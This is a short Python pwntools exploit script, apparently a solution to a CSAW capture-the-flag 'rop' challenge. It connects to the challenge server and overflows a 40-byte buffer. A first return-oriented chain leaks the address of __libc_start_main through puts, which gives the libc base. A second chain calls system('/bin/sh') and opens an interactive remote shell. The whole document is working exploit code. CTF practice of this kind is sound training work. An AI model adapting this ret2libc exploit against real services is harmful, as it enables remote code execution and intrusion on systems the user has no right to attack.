from pwn import *

io = remote('pwn.chal.csaw.io', 5016)
elf = ELF('./rop')
libc = ELF('./libc-2.27.so')
#io = process(elf.path)
rop = ROP(elf)

main = elf.symbols['main']
puts_plt = elf.plt['puts']
libc_start_main = elf.symbols['__libc_start_main']
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
ret = (rop.find_gadget(['ret']))[0]

log.info("main: " + hex(main))
log.info("puts@plt: " + hex(puts_plt))
log.info("__libc_start_main: " + hex(libc_start_main))
log.info("pop rdi gadget: " + hex(pop_rdi))

base = b'A'*40
print(io.recvline())

payload = base + p64(pop_rdi) + p64(libc_start_main) + p64(puts_plt) + p64(main) + b'\n'
io.send(payload)

recieved = io.recvline().strip()
leak = u64(recieved.ljust(8, b'\x00'))
log.info("Leaked libc address,  __libc_start_main: " + hex(leak))
libc.address = leak - libc.sym["__libc_start_main"]
log.info("Address of libc: " + hex(libc.address))

binsh = next(libc.search(b'/bin/sh'))
system = libc.sym['system']

log.info("/bin/sh: " + hex(binsh))
log.info("system: " + hex(system))

print(io.recvline())
payload = base + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system) + b'\n'
io.send(payload)

io.interactive()
